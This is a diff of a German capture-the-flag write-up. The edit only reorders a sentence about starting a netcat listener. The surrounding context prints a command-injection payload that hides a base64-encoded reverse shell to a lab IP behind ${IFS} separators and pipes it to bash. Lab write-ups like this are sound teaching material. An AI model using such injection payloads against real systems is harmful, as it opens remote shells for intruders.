@@ -107,7 +107,7 @@ Daraus ergab sich die finale Payload:
 ;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjI5Lzg4ODggMD4mMQ"|base64${IFS}-d|bash;
 ```
 
-Nachdem ich diese Payload abgeschickt hatte, startete ich `nc -lvnp 8888` und freute mich, eine funktionierende Shell in den Händen zu halten.
+Ich startete `nc -lvnp 8888`, schickte die Payload ab und freute mich, eine funktionierende Shell in den Händen zu halten.
 
 
 Nach dem erfolgreichen Erhalt einer Shell, inspizierte ich den aktuellen Arbeitsverzeichnisinhalt und fand die Datei `cloudhosting-0.0.1.jar`:
